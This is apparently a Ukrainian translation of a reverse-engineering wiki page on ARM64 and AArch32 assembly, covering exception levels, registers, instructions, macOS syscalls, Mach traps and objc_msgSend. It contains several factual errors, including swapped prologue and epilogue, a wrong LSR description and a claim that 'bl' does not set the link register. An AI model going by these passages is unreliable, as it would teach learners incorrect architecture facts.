## **Рівні винятків - EL (ARM64v8)**

В архітектурі ARMv8 рівні виконання, відомі як рівні винятків (Exception Levels, EL), визначають рівень привілеїв і можливості середовища виконання. Існує чотири рівні винятків — від EL0 до EL3, кожен із яких має різне призначення:

1. **EL0 - режим користувача**:
- Це рівень із найменшими привілеями, який використовується для виконання звичайного коду застосунків.
- Застосунки, що працюють на EL0, ізольовані один від одного та від системного програмного забезпечення, що підвищує безпеку і стабільність.
2. **EL1 - режим ядра операційної системи**:
- Більшість ядер операційних систем працює на цьому рівні.
- EL1 має більше привілеїв, ніж EL0, і може отримувати доступ до системних ресурсів, але з певними обмеженнями для забезпечення цілісності системи. Перехід з EL0 до EL1 виконується інструкцією SVC.
3. **EL2 - режим гіпервізора**:
- Цей рівень використовується для віртуалізації. Гіпервізор, що працює на EL2, може керувати кількома операційними системами (кожна у власному EL1), що працюють на одному фізичному обладнанні.
- EL2 надає функції для ізоляції та керування віртуалізованими середовищами.
- Тому застосунки віртуальних машин, як-от Parallels, можуть використовувати `hypervisor.framework` для взаємодії з EL2 і запускати віртуальні машини без kernel extensions.
- Для переходу з EL1 до EL2 використовується інструкція `HVC`.
4. **EL3 - режим захищеного монітора**:
- Це найпривілейованіший рівень, який часто використовується для безпечного завантаження та trusted execution environments.
- EL3 може керувати доступом між захищеними та незахищеними станами (наприклад, secure boot, trusted OS тощо).
- Раніше він використовувався для KPP (Kernel Patch Protection) у macOS, але більше не використовується.
- Apple більше не використовує EL3.
- Перехід до EL3 зазвичай виконується за допомогою інструкції `SMC` (Secure Monitor Call).

Використання цих рівнів забезпечує структурований і безпечний спосіб керування різними аспектами системи — від застосунків користувача до найбільш привілейованого системного програмного забезпечення. Підхід ARMv8 до рівнів привілеїв допомагає ефективно ізолювати різні компоненти системи, підвищуючи її безпеку та надійність.

## **Регістри (ARM64v8)**

ARM64 має **31 регістр загального призначення**, позначених як `x0`–`x30`. Кожен із них може зберігати значення розміром **64 біти** (8 байтів). Для операцій, яким потрібні лише 32-бітові значення, ті самі регістри можна використовувати в 32-бітовому режимі під іменами w0–w30.

1. **`x0`** до **`x7`** — зазвичай використовуються як scratch registers і для передавання параметрів підпрограмам.
- **`x0`** також містить дані, що повертаються функцією
2. **`x8`** — у ядрі Linux `x8` використовується як номер system call для інструкції `svc`. **У macOS використовується x16!**
3. **`x9`** до **`x15`** — додаткові тимчасові регістри, які часто використовуються для локальних змінних.
4. **`x16`** і **`x17`** — **Intra-procedural Call Registers**. Тимчасові регістри для безпосередніх значень. Також використовуються для непрямих викликів функцій і PLT (Procedure Linkage Table) stubs.
- **`x16`** використовується як **номер system call** для інструкції **`svc`** у **macOS**.
5. **`x18`** — **Platform register**. Може використовуватися як регістр загального призначення, але на деяких платформах зарезервований для специфічних потреб платформи: вказівник на current thread environment block у Windows або вказівник на поточну **executing task structure у ядрі Linux**.
6. **`x19`** до **`x28`** — це callee-saved registers. Функція повинна зберігати значення цих регістрів для свого caller, тому вони зберігаються у stack і відновлюються перед поверненням до caller.
7. **`x29`** — **frame pointer**, який використовується для відстеження stack frame. Коли створюється новий stack frame через виклик функції, регістр **`x29`** **зберігається у stack**, а адреса **нового** frame pointer (адреса **`sp`**) **зберігається в цьому регістрі**.
- Цей регістр також можна використовувати як **регістр загального призначення**, хоча зазвичай він використовується як посилання на **локальні змінні**.
8. **`x30`** або **`lr`** — **Link register**. Він містить **адресу повернення**, коли виконується інструкція `BL` (Branch with Link) або `BLR` (Branch with Link to Register), шляхом збереження значення **`pc`** у цьому регістрі.
- Його також можна використовувати як будь-який інший регістр.
- Якщо поточна функція збирається викликати нову функцію і тому перезапише `lr`, вона збереже його у stack на початку — це epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> зберегти `fp` і `lr`, виділити місце та отримати новий `fp`) — і відновить його в кінці, це prologue (`ldp x29, x30, [sp], #48; ret` -> відновити `fp` і `lr` та повернутися).
9. **`sp`** — **Stack pointer**, використовується для відстеження вершини stack.
- Значення **`sp`** завжди має бути вирівняне щонайменше за **quadword**, інакше може виникнути помилка вирівнювання.
10. **`pc`** — **Program counter**, який вказує на наступну інструкцію. Цей регістр можна оновлювати лише через генерацію винятків, повернення з винятків і переходи. Єдині звичайні інструкції, які можуть читати цей регістр, — інструкції branch with link (BL, BLR), що зберігають адресу **`pc`** у **`lr`** (Link Register).
11. **`xzr`** — **Zero register**. У 32-бітовій формі регістра також називається **`wzr`**. Його можна використовувати для швидкого отримання нульового значення (поширена операція) або для виконання порівнянь за допомогою **`subs`**, наприклад **`subs XZR, Xn, #10`**, зберігаючи результати обчислення ніде (у **`xzr`**).

Регістри **`Wn`** — це **32-бітова** версія регістрів **`Xn`**.

> [!TIP]
> Регістри X0–X18 є volatile, тобто їхні значення можуть змінюватися під час викликів функцій і переривань. Натомість регістри X19–X28 є non-volatile, тобто їхні значення мають зберігатися між викликами функцій ("callee saved").

### SIMD і регістри floating-point

Крім того, існує ще **32 регістри завдовжки 128 біт**, які можна використовувати в оптимізованих операціях single instruction multiple data (SIMD) і для виконання арифметики floating-point. Вони називаються регістрами Vn, хоча також можуть працювати з розрядністю **64**, **32**, **16** і **8** біт; тоді вони називаються **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** і **`Bn`**.

### Системні регістри

**Існують сотні системних регістрів**, також відомих як special-purpose registers (SPRs), які використовуються для **моніторингу** та **керування** поведінкою **процесорів**.\
Їх можна читати або встановлювати лише за допомогою спеціальних інструкцій **`mrs`** і **`msr`**.

Спеціальні регістри **`TPIDR_EL0`** і **`TPIDDR_EL0`** часто зустрічаються під час reverse engineering. Суфікс `EL0` вказує на **мінімальний рівень винятків**, із якого можна отримати доступ до регістра (у цьому випадку EL0 — звичайний рівень винятків (привілеїв), з яким працюють звичайні програми).\
Вони часто використовуються для зберігання **базової адреси області thread-local storage** у пам'яті. Зазвичай перший регістр доступний для читання і запису програмам, що працюють на EL0, а другий можна читати з EL0 і записувати з EL1 (наприклад, ядром).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** містить кілька компонентів процесу, серіалізованих у видимий операційній системі спеціальний регістр **`SPSR_ELx`**, де X — це **рівень дозволів** **викликаного** винятку (це дає змогу відновити стан процесу після завершення винятку).\

- Прапори умов **`N`**, **`Z`**, **`C`** і **`V`**:
- **`N`** означає, що операція дала від'ємний результат
- **`Z`** означає, що операція дала нульовий результат
- **`C`** означає, що операція дала перенос
- **`V`** означає, що операція дала знакове переповнення:
- Сума двох додатних чисел дає від'ємний результат.
- Сума двох від'ємних чисел дає додатний результат.
- Під час віднімання, коли велике від'ємне число віднімається від меншого додатного числа (або навпаки), а результат неможливо представити в межах діапазону заданої розрядності.
- Очевидно, процесор не знає, чи є операція знаковою, тому під час операцій він перевіряє C і V та вказує, чи стався перенос у знаковому або беззнаковому випадку.

> [!WARNING]
> Не всі інструкції оновлюють ці прапори. Деякі, як-от **`CMP`** або **`TST`**, роблять це, а також інші інструкції із суфіксом s, наприклад **`ADDS`**.

- Прапор поточної розрядності регістрів (**`nRW`**): якщо прапор має значення 0, після відновлення програма працюватиме у стані виконання AArch64.
- Поточний **рівень винятків** (**`EL`**): звичайна програма, що працює в EL0, матиме значення 0
- Прапор **покрокового виконання** (**`SS`**): використовується debuggers для покрокового виконання шляхом встановлення прапора SS у значення 1 всередині **`SPSR_ELx`** через виняток. Програма виконає одну інструкцію та викличе виняток покрокового виконання.
- Прапор стану **недопустимого винятку** (**`IL`**): використовується для позначення ситуації, коли привілейоване програмне забезпечення виконує недійсний перехід між рівнями винятків; цей прапор встановлюється в 1, і процесор викликає виняток недійсного стану.
- Прапори **`DAIF`**: ці прапори дають змогу привілейованій програмі вибірково маскувати певні зовнішні винятки.
- Якщо **`A`** дорівнює 1, це означає, що викликатимуться **asynchronous aborts**. **`I`** налаштовує реагування на зовнішні апаратні **Interrupts Requests** (IRQ), а F пов'язаний із **Fast Interrupt Requests** (FIR).
- Прапори вибору stack pointer (**`SPS`**): привілейовані програми, що працюють на EL1 і вище, можуть перемикатися між використанням власного регістра stack pointer і регістра user-model (наприклад, між `SP_EL1` і `EL0`). Перемикання виконується записом у спеціальний регістр **`SPSel`**. З EL0 це зробити неможливо.

## **Calling Convention (ARM64v8)**

Calling convention ARM64 визначає, що **перші вісім параметрів** функції передаються в регістрах **`x0`**–**`x7`**. **Додаткові** параметри передаються через **stack**. Значення, що **повертається**, передається в регістрі **`x0`** або також у **`x1`**, **якщо його довжина становить 128 біт**. Регістри **`x19`**–**`x30`** і **`sp`** мають **зберігатися** між викликами функцій.

Під час читання функції в assembly шукайте **function prologue і epilogue**. **Prologue** зазвичай включає **збереження frame pointer (`x29`)**, налаштування **нового frame pointer** і **виділення місця у stack**. **Epilogue** зазвичай включає **відновлення збереженого frame pointer** і **повернення** з функції.

### Calling Convention у Swift

Swift має власний **calling convention**, який можна знайти за посиланням [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Поширені інструкції (ARM64v8)**

Інструкції ARM64 зазвичай мають **формат `opcode dst, src1, src2`**, де **`opcode`** — це операція, яку потрібно виконати (наприклад, `add`, `sub`, `mov` тощо), **`dst`** — регістр **призначення**, у якому буде збережено результат, а **`src1`** і **`src2`** — **вихідні** регістри. Замість вихідних регістрів також можна використовувати безпосередні значення.

- **`mov`**: **переміщує** значення з одного **регістра** в інший.
- Приклад: `mov x0, x1` — переміщує значення з `x1` до `x0`.
- **`ldr`**: **завантажує** значення з **пам'яті** в **регістр**.
- Приклад: `ldr x0, [x1]` — завантажує значення з адреси пам'яті, на яку вказує `x1`, до `x0`.
- **Режим offset**: offset, що впливає на початковий вказівник, задається, наприклад, так:
- `ldr x2, [x1, #8]`, завантажує в x2 значення з x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, завантажує в x2 об'єкт із масиву x0 з позиції x1 (індекс) \* 4
- **Режим pre-indexed**: обчислення застосовується до початкового значення, отримується результат, а нове початкове значення також зберігається у початковому регістрі.
- `ldr x2, [x1, #8]!`, завантажує `x1 + 8` у `x2` і зберігає результат `x1 + 8` у x1
- `str lr, [sp, #-4]!`, зберігає link register у sp та оновлює регістр sp
- **Режим post-index**: подібний до попереднього, але спочатку адресу пам'яті використано, а потім обчислено й збережено offset.
- `ldr x0, [x1], #8`, завантажує `x1` у `x0` і оновлює x1 значенням `x1 + 8`
- **PC-relative addressing**: у цьому випадку адреса для завантаження обчислюється відносно регістра PC
- `ldr x1, =_start`, завантажує в x1 адресу, з якої починається символ `_start`, відносно поточного PC.
- **`str`**: **зберігає** значення з **регістра** в **пам'ять**.
- Приклад: `str x0, [x1]` — зберігає значення в `x0` в адресі пам'яті, на яку вказує `x1`.
- **`ldp`**: **Load Pair of Registers**. Ця інструкція **завантажує два регістри** з **послідовних ділянок пам'яті**. Адреса пам'яті зазвичай формується додаванням offset до значення іншого регістра.
- Приклад: `ldp x0, x1, [x2]` — завантажує `x0` і `x1` з адрес пам'яті `x2` і `x2 + 8` відповідно.
- **`stp`**: **Store Pair of Registers**. Ця інструкція **зберігає два регістри** в **послідовних ділянках пам'яті**. Адреса пам'яті зазвичай формується додаванням offset до значення іншого регістра.
- Приклад: `stp x0, x1, [sp]` — зберігає `x0` і `x1` за адресами пам'яті `sp` і `sp + 8` відповідно.
- `stp x0, x1, [sp, #16]!` — зберігає `x0` і `x1` за адресами пам'яті `sp+16` і `sp + 24` відповідно та оновлює `sp` значенням `sp+16`.
- **`add`**: **додає** значення двох регістрів і зберігає результат у регістрі.
- Синтаксис: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> призначення
- Xn2 -> операнд 1
- Xn3 | #imm -> операнд 2 (регістр або безпосереднє значення)
- \[shift #N | RRX] -> виконує зсув або викликає RRX
- Приклад: `add x0, x1, x2` — додає значення `x1` і `x2` та зберігає результат у `x0`.
- `add x5, x5, #1, lsl #12` — це дорівнює 4096 (зсув 1 уліво 12 разів) -> 1 0000 0000 0000 0000
- **`adds`** виконує `add` і оновлює прапори
- **`sub`**: **віднімає** значення двох регістрів і зберігає результат у регістрі.
- Див. **синтаксис** **`add`**.
- Приклад: `sub x0, x1, x2` — віднімає значення `x2` від `x1` і зберігає результат у `x0`.
- **`subs`** подібна до sub, але оновлює прапор
- **`mul`**: **перемножує** значення **двох регістрів** і зберігає результат у регістрі.
- Приклад: `mul x0, x1, x2` — перемножує значення `x1` і `x2` та зберігає результат у `x0`.
- **`div`**: **ділить** значення одного регістра на інший і зберігає результат у регістрі.
- Приклад: `div x0, x1, x2` — ділить значення `x1` на `x2` і зберігає результат у `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Логічний зсув уліво**: додає 0 з кінця, переміщуючи інші біти вперед (множення на n разів по 2)
- **Логічний зсув управо**: додає 1 на початку, переміщуючи інші біти назад (ділення на n разів по 2 у беззнаковому представленні)
- **Арифметичний зсув управо**: подібний до **`lsr`**, але замість додавання 0, якщо старший біт дорівнює 1, додаються **1** (ділення на n разів по 2 у знаковому представленні)
- **Циклічний зсув управо**: подібний до **`lsr`**, але все, що видаляється справа, додається зліва
- **Циклічний зсув управо з розширенням**: подібний до **`ror`**, але прапор переносу є "найстаршим бітом". Таким чином, прапор переносу переміщується в біт 31, а видалений біт — у прапор переносу.
- **`bfm`**: **Bit Field Move**, ці операції **копіюють біти `0...n`** зі значення та розміщують їх у позиціях **`m..m+n`**. **`#s`** визначає позицію **крайнього лівого біта**, а **`#r`** — величину циклічного зсуву управо.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** копіює бітове поле з одного регістра та копіює його в інший регістр.
- **`BFI X1, X2, #3, #4`** вставляє 4 біти з X2, починаючи з 3-го біта X1
- **`BFXIL X1, X2, #3, #4`** вилучає з 3-го біта X2 чотири біти та копіює їх у X1
- **`SBFIZ X1, X2, #3, #4`** розширює знак 4 бітів із X2 і вставляє їх у X1, починаючи з позиції біта 3, обнуляючи праві біти
- **`SBFX X1, X2, #3, #4`** вилучає з X2 4 біти, починаючи з біта 3, розширює їх за знаком і розміщує результат у X1
- **`UBFIZ X1, X2, #3, #4`** розширює 4 біти з X2 нулями та вставляє їх у X1, починаючи з позиції біта 3, обнуляючи праві біти
- **`UBFX X1, X2, #3, #4`** вилучає з X2 4 біти, починаючи з біта 3, і розміщує результат із нульовим розширенням у X1.
- **Sign Extend To X:** розширює знак значення (або додає лише 0 у беззнаковій версії), щоб із ним можна було виконувати операції:
- **`SXTB X1, W2`** розширює знак байта **з W2 до X1** (`W2` — половина `X2`), щоб заповнити 64 біти
- **`SXTH X1, W2`** розширює знак 16-бітового числа **з W2 до X1**, щоб заповнити 64 біти
- **`SXTW X1, W2`** розширює знак байта **з W2 до X1**, щоб заповнити 64 біти
- **`UXTB X1, W2`** додає 0 (беззнаково) до байта **з W2 до X1**, щоб заповнити 64 біти
- **`extr`:** вилучає біти із зазначеної **пари об'єднаних регістрів**.
- Приклад: `EXTR W3, W2, W1, #3` об'єднає **W1+W2** і отримає **від біта 3 у W2 до біта 3 у W1**, зберігши результат у W3.
- **`cmp`**: **порівнює** два регістри та встановлює прапори умов. Це **псевдонім `subs`**, який встановлює регістр призначення в zero register. Корисно для перевірки, чи `m == n`.
- Підтримує **той самий синтаксис, що й `subs`**
- Приклад: `cmp x0, x1` — порівнює значення в `x0` і `x1` та відповідно встановлює прапори умов.
- **`cmn`**: **порівнює** від'ємний операнд. У цьому випадку це **псевдонім `adds`** і він підтримує той самий синтаксис. Корисно для перевірки, чи `m == -n`.
- **`ccmp`**: умовне порівняння; порівняння виконується лише за істинності попереднього порівняння та встановлює біти nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> якщо x1 != x2 і x3 < x4, перейти до func
- Це відбувається тому, що **`ccmp`** виконується лише якщо **попередній `cmp` мав результат `NE`**; якщо ні, біти `nzcv` встановлюються в 0 (що не задовольнить порівняння `blt`).
- Це також можна використовувати як `ccmn` (те саме, але для від'ємного значення, як `cmp` порівняно з `cmn`).
- **`tst`**: перевіряє, чи є обидва значення порівняння рівними 1 (працює як ANDS без збереження результату). Корисно для перевірки регістра зі значенням і визначення, чи дорівнює 1 будь-який із бітів регістра, зазначених у цьому значенні.
- Приклад: `tst X1, #7` перевіряє, чи дорівнює 1 хоча б один із останніх 3 бітів X1
- **`teq`**: операція XOR із відкиданням результату
- **`b`**: безумовний перехід
- Приклад: `b myFunction`
- Зверніть увагу, що ця інструкція не заповнює link register адресою повернення (не підходить для викликів підпрограм, які мають повертатися назад)
- **`bl`**: **Branch** with link, використовується для **виклику** **підпрограми**. Зберігає **адресу повернення в `x30`**.
- Приклад: `bl myFunction` — викликає функцію `myFunction` і зберігає адресу повернення в `x30`.
- Зверніть увагу, що ця інструкція не заповнює link register адресою повернення (не підходить для викликів підпрограм, які мають повертатися назад)
- **`blr`**: **Branch** with Link to Register, використовується для **виклику** **підпрограми**, ціль якої **задана** в **регістрі**. Зберігає адресу повернення в `x30`. (Це
- Приклад: `blr x1` — викликає функцію, адреса якої міститься в `x1`, і зберігає адресу повернення в `x30`.
- **`ret`**: **повернення** з **підпрограми**, зазвичай із використанням адреси в **`x30`**.
- Приклад: `ret` — повертається з поточної підпрограми, використовуючи адресу повернення в `x30`.
- **`b.<cond>`**: умовні переходи
- **`b.eq`**: **перехід, якщо дорівнює**, на основі попередньої інструкції `cmp`.
- Приклад: `b.eq label` — якщо попередня інструкція `cmp` виявила два однакові значення, виконується перехід до `label`.
- **`b.ne`**: **перехід, якщо не дорівнює**. Ця інструкція перевіряє прапори умов (встановлені попередньою інструкцією порівняння) і, якщо порівнювані значення не дорівнюють одне одному, переходить до мітки або адреси.
- Приклад: після інструкції `cmp x0, x1`, `b.ne label` — якщо значення в `x0` і `x1` не дорівнюють одне одному, виконується перехід до `label`.
- **`cbz`**: **Compare and Branch on Zero**. Ця інструкція порівнює регістр із нулем і, якщо вони рівні, переходить до мітки або адреси.
- Приклад: `cbz x0, label` — якщо значення в `x0` дорівнює нулю, виконується перехід до `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Ця інструкція порівнює регістр із нулем і, якщо вони не рівні, переходить до мітки або адреси.
- Приклад: `cbnz x0, label` — якщо значення в `x0` не дорівнює нулю, виконується перехід до `label`.
- **`tbnz`**: перевірка біта та перехід, якщо він не дорівнює нулю
- Приклад: `tbnz x0, #8, label`
- **`tbz`**: перевірка біта та перехід, якщо він дорівнює нулю
- Приклад: `tbz x0, #8, label`
- **Операції умовного вибору**: це операції, поведінка яких залежить від бітів умов.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> якщо істина, X0 = X1, якщо хибність, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> якщо істина, Xd = Xn, якщо хибність, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> якщо істина, Xd = Xn + 1, якщо хибність, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> якщо істина, Xd = Xn, якщо хибність, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> якщо істина, Xd = NOT(Xn), якщо хибність, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> якщо істина, Xd = Xn, якщо хибність, Xd = - Xm
- `cneg Xd, Xn, cond` -> якщо істина, Xd = - Xn, якщо хибність, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> якщо істина, Xd = 1, якщо хибність, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> якщо істина, Xd = \<all 1>, якщо хибність, Xd = 0
- **`adrp`**: обчислює **адресу сторінки символу** та зберігає її в регістрі.
- Приклад: `adrp x0, symbol` — обчислює адресу сторінки `symbol` і зберігає її в `x0`.
- **`ldrsw`**: **завантажує** знакове **32-бітове** значення з пам'яті та **розширює його за знаком до 64** біт. Використовується для поширених випадків SWITCH.
- Приклад: `ldrsw x0, [x1]` — завантажує знакове 32-бітове значення з адреси пам'яті, на яку вказує `x1`, розширює його за знаком до 64 біт і зберігає в `x0`.
- **`stur`**: **зберігає значення регістра в адресу пам'яті**, використовуючи offset від іншого регістра.
- Приклад: `stur x0, [x1, #4]` — зберігає значення в `x0` в адресі пам'яті, яка на 4 байти більша за адресу, що наразі міститься в `x1`.
- **`svc`** : виконує **system call**. Це скорочення від "Supervisor Call". Коли процесор виконує цю інструкцію, він **перемикається з режиму користувача в режим ядра** і переходить до визначеної області пам'яті, де розташований код **обробки system call ядром**.

- Приклад:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Зберегти link register і frame pointer у stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Налаштувати новий frame pointer**: `mov x29, sp` (налаштовує новий frame pointer для поточної функції)
3. **Виділити місце в стеку для локальних змінних** (якщо потрібно): `sub sp, sp, <size>` (де `<size>` — кількість необхідних байтів)

### **Епілог функції**

1. **Звільнити локальні змінні (якщо для них було виділено місце)**: `add sp, sp, <size>`
2. **Відновити link register і frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Повернення**: `ret` (повертає керування викликачеві, використовуючи адресу в link register)

## Стан виконання AARCH32

Armv8-A підтримує виконання 32-bit програм. **AArch32** може працювати в одному з **двох наборів інструкцій**: **`A32`** і **`T32`**, і може перемикатися між ними через **`interworking`**.\
**Привілейовані** 64-bit програми можуть планувати **виконання 32-bit** програм, виконуючи transfer на нижчий привілейований 32-bit exception level.\
Зверніть увагу, що перехід із 64-bit до 32-bit відбувається зі зниженням exception level (наприклад, 64-bit програма в EL1 запускає програму в EL0). Це виконується встановленням **біта 4** спеціального register **`SPSR_ELx`** **у 1**, коли thread процесу `AArch32` готовий до виконання, а решта `SPSR_ELx` зберігає CPSR програми **`AArch32`**. Потім привілейований процес викликає інструкцію **`ERET`**, тому processor переходить до **`AArch32`**, входячи в A32 або T32 залежно від CPSR**.**

**`interworking`** відбувається за допомогою бітів J і T у CPSR. `J=0` і `T=0` означає **`A32`**, а `J=0` і `T=1` означає **T32**. По суті, це означає встановлення **наймолодшого біта в 1**, щоб вказати, що набором інструкцій є T32.\
Це встановлюється під час **інструкцій переходу `interworking`,** але також може бути встановлено безпосередньо іншими інструкціями, коли PC встановлюється як destination register. Приклад:

Інший приклад:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Регістри

Існує 16 32-бітних регістрів (r0-r15). **Від r0 до r14** їх можна використовувати для **будь-якої операції**, однак деякі з них зазвичай зарезервовані:

- **`r15`**: Лічильник команд (завжди). Містить адресу наступної інструкції. В A32: поточна адреса + 8, у T32: поточна адреса + 4.
- **`r11`**: Вказівник кадру
- **`r12`**: Регістр внутрішньопроцедурних викликів
- **`r13`**: Вказівник стека (зверніть увагу, що стек завжди вирівняний на 16 байт)
- **`r14`**: Регістр зв'язку

Крім того, регістри зберігаються в **`banked registries`**. Це місця, у яких зберігаються значення регістрів, що дає змогу виконувати **швидке перемикання контексту** під час обробки винятків і виконання привілейованих операцій, уникаючи необхідності щоразу вручну зберігати та відновлювати регістри.\
Це виконується шляхом **збереження стану процесора з `CPSR` до `SPSR`** режиму процесора, до якого передається керування під час винятку. Після повернення з винятку **`CPSR`** відновлюється з **`SPSR`**.

### CPSR - Current Program Status Register

В AArch32 CPSR працює подібно до **`PSTATE`** в AArch64 і також зберігається в **`SPSR_ELx`**, коли виникає виняток, щоб згодом відновити виконання:

Поля поділено на кілька груп:

- Application Program Status Register (APSR): арифметичні прапорці, доступні з EL0
- Execution State Registers: поведінка процесу (керується ОС).

#### Application Program Status Register (APSR)

- Прапорці **`N`**, **`Z`**, **`C`**, **`V`** (так само, як в AArch64)
- Прапорець **`Q`**: встановлюється в 1 щоразу, коли під час виконання спеціалізованої арифметичної інструкції з насиченням відбувається **цілочисельне насичення**. Після встановлення в **`1`** він зберігає це значення, доки його вручну не встановлять у 0. Крім того, не існує інструкції, яка неявно перевіряє його значення; його потрібно перевіряти вручну шляхом читання.
- Прапорці **`GE`** (Greater than or equal): використовуються в операціях SIMD (Single Instruction, Multiple Data), таких як «паралельне додавання» та «паралельне віднімання». Ці операції дають змогу обробляти кілька точок даних в одній інструкції.

Наприклад, інструкція **`UADD8`** **паралельно додає чотири пари байтів** (із двох 32-бітних операндів) і зберігає результати в 32-бітному регістрі. Потім вона **встановлює прапорці `GE` в `APSR`** на основі цих результатів. Кожен прапорець GE відповідає одному з додавань байтів і вказує, чи **переповнилося** додавання для цієї пари байтів.

Інструкція **`SEL`** використовує ці прапорці GE для виконання умовних дій.

#### Execution State Registers

- Біти **`J`** і **`T`**: **`J`** має дорівнювати 0; якщо **`T`** дорівнює 0, використовується набір інструкцій A32, а якщо дорівнює 1 — T32.
- **IT Block State Register** (`ITSTATE`): це біти 10-15 і 25-26. Вони зберігають умови для інструкцій усередині групи з префіксом **`IT`**.
- Біт **`E`**: вказує на **порядок байтів**.
- **Mode and Exception Mask Bits** (0-4): визначають поточний стан виконання. **5-й** біт вказує, чи працює програма як 32-бітна (значення 1) або 64-бітна (значення 0). Інші 4 представляють режим винятку, який наразі використовується (коли виникає виняток і він обробляється). Встановлене число **вказує поточний пріоритет** у випадку, якщо під час обробки буде викликано інший виняток.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: деякі винятки можна вимкнути за допомогою бітів **`A`**, `I`, `F`. Якщо **`A`** дорівнює 1, це означає, що будуть викликатися **асинхронні переривання**. **`I`** налаштовує реакцію на зовнішні апаратні **Interrupts Requests** (IRQ). А `F` пов'язаний із **Fast Interrupt Requests** (FIR).

## macOS

### BSD syscalls

Перегляньте [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) або виконайте `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls матимуть **x16 > 0**.

### Mach Traps

У [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) перегляньте `mach_trap_table`, а в [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) — прототипи. Максимальна кількість Mach traps — `MACH_TRAP_TABLE_COUNT` = 128. Mach traps матимуть **x16 < 0**, тому потрібно викликати номери з попереднього списку зі знаком **мінус**: **`_kernelrpc_mach_vm_allocate_trap`** має значення **`-10`**.

Також можна перевірити **`libsystem_kernel.dylib`** у дизасемблері, щоб знайти спосіб виклику цих (і BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Зверніть увагу, що **Ida** і **Ghidra** також можуть декомпілювати **specific dylibs** із cache, якщо просто передати cache.

> [!TIP]
> Іноді простіше перевірити **decompiled** код із **`libsystem_kernel.dylib`**, **ніж** перевіряти **source code**, оскільки код кількох syscall (BSD і Mach) генерується за допомогою scripts (див. comments у source code), тоді як у dylib можна знайти, що саме викликається.

### виклики machdep

XNU підтримує інший тип викликів, які називаються machine dependent. Номери цих викликів залежать від architecture, і ні самі виклики, ні їхні номери не гарантовано залишатимуться незмінними.

### comm page

Це сторінка памʼяті, власником якої є kernel, що відображається в address space кожного users process. Вона призначена для того, щоб зробити перехід із user mode у kernel space швидшим, ніж використання syscall для kernel services, які використовуються настільки часто, що цей перехід був би дуже неефективним.

Наприклад, виклик `gettimeofdate` безпосередньо читає значення `timeval` із comm page.

### objc_msgSend

Цю function дуже часто можна зустріти в програмах Objective-C або Swift. Ця function дає змогу викликати method обʼєкта Objective-C.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pointer to the instance
- x1: op -> Selector of the method
- x2... -> Rest of the arguments of the invoked method

Отже, якщо встановити breakpoint перед branch до цієї function, у lldb можна легко визначити, що саме викликається (у цьому прикладі object викликає object із `NSConcreteTask`, який запустить command):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Якщо встановити env variable **`NSObjCMessageLoggingEnabled=1`**, можна логувати момент виклику цієї функції у файлі на кшталт `/tmp/msgSends-pid`.
>
> Крім того, якщо встановити **`OBJC_HELP=1`** і викликати будь-який binary, можна побачити інші environment variables, які можна використовувати для **log** моментів виконання певних дій Objc-C.

Коли ця функція викликається, потрібно знайти викликаний method вказаного instance. Для цього виконуються такі пошуки:

- Виконати оптимістичний пошук у cache:
- Якщо успішно, завершити
- Отримати runtimeLock (read)
- Якщо (realize && !cls->realized), виконати realize class
- Якщо (initialize && !cls->initialized), виконати initialize class
- Перевірити власний cache class:
- Якщо успішно, завершити
- Перевірити список methods class:
- Якщо знайдено, заповнити cache і завершити
